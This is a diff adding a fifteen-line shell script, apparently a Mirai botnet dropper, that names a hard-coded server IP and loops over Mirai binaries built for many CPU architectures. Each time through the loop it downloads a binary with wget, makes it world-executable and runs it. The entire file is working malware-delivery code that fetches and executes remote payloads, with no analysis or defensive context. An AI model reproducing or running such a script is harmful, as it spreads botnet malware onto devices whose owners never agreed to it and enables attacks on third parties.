@@ -1,0 +1,15 @@
+#!/bin/sh
+
+# Edit
+WEBSERVER="89.46.222.101:80"
+# Stop editing now
+
+
+BINARIES="mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O panda9494
+    chmod 777 panda9494
+    ./panda9494
+done
+
